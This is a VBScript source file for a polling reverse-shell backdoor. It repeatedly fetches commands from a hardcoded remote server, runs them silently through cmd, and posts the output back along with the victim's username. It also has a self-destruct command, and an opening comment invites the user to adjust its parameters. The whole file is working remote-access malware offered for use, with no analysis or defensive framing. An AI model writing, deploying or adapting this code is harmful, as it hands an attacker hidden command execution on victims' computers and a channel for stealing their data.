Option Explicit
On Error Resume Next

' Parameters, adjust to your needs
Dim serverHost
serverHost = "http://172.16.98.151:18000/"
Dim pollingPeriod
pollingPeriod = 2000


' Instantiate objects
Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
Dim oHTTP: set oHTTP = CreateObject("Microsoft.XMLHTTP")

Dim userName
userName = CreateObject("WScript.Network").UserName

' A new cmd is open at each command so need to keep track of directory if changed
Dim currentPath

Function HTTPGet(sUrl)
    oHTTP.Open "GET", sUrl, False
    oHTTP.Send
    HTTPGet = oHTTP.responseText
End Function

Function HTTPPost(sUrl, sBody)
    oHTTP.open "POST", sUrl,false
    oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    oHTTP.setRequestHeader "Content-Length", Len(sBody)
    oHTTP.send sBody
    HTTPPost = oHTTP.responseText
End Function



Function ExecuteCommand(command)
    ' Taken from revbshell

    ' Execute and write to file
    Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
    shell.Run "cmd /C " & command &" > """ & strOutFile & """ 2>&1", 0, True

    ' Read out file
    Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
    Dim consoleOutput
    If Not file.AtEndOfStream Then
        consoleOutput = file.ReadAll
    Else
        consoleOutput = "[empty result]"
    End If

    file.Close
    fs.DeleteFile strOutFile, True

    ' Clean up
    strOutFile = Empty

    ' Return
    ExecuteCommand = consoleOutput

End Function

' Periodically poll for commands
While True


    Dim command
    command = HTTPGet(serverHost & "cmd?username=" & userName)

    Select Case LCase(command)

    Case "standby"
        'nothing

    Case "selfdestruct"
        Dim selfDestructConfirmation
        selfDestructConfirmation = HTTPPost(serverHost & "response","output=SELF DESTRUCTED" & "&username=" & userName)
        WScript.Quit 0

    Case else
        ' Exectue the command
        Dim consoleOutput
        consoleOutput = ExecuteCommand(command)

        'Make an HTTP POST request to send back the console output
        Dim confirmation
        confirmation = HTTPPost(serverHost & "response","output=" & consoleOutput & "&username=" & userName)

    End Select

    ' Sleep for a while
    WScript.Sleep pollingPeriod
Wend
